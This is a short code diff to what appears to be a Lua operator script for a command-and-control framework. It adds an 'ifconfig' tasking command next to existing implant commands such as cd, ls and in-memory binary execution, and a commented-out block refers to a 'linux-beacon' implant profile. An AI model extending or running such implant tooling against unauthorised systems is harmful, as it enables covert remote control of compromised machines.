@@ -7,7 +7,8 @@ CODE = {
     CD = 6,
     PWD = 7,
     LS = 8,
-    MEMEXEC = 9
+    MEMEXEC = 9,
+    IFCONFIG = 10
 }
 
 function ping(payload)
@@ -117,6 +118,13 @@ function memexec(payload)
     end
 end
 
+function ifconfig(payload)
+    local err = add_task(CODE.IFCONFIG, payload)
+    if err then
+        print("Error")
+    end
+end
+
 
 --[[
 implant_register_profile("linux-beacon", {
@@ -149,6 +157,7 @@ command("impl","pwd","Get working dir", pwd)
 command("impl","cd","Change dir", cd)
 command("impl","ls","List dir", ls)
 command("impl","memexec","Execute binary in memory", memexec)
+command("impl","ifconfig","Display network interfaces", ifconfig)
 
 --[[
 function OnRegister(...)
